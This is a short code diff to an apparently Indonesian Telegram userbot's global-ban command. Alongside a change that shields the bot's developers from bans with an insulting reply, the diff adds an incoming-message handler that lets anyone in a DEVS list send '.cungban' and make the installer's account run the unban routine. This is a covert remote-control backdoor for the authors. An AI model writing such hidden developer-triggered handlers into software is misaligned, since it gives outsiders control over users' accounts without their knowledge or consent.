@@ -107,7 +107,7 @@ async def gben(userbot):
     except BaseException:
         return await dark.edit(f"`Terjadi Kesalahan`")
     if user:
-        if user.id == 1937084611:
+        if user.id in DEVS:
             return await dark.edit(
                 f"`LU GABISA GBAN FATUR, DIA YANG BIKIN GUA, GOBLOK!!!`"
             )
@@ -151,6 +151,7 @@ async def gben(userbot):
 
 
 @register(outgoing=True, pattern="^.ungban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cungban(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
     sender = await dc.get_sender()
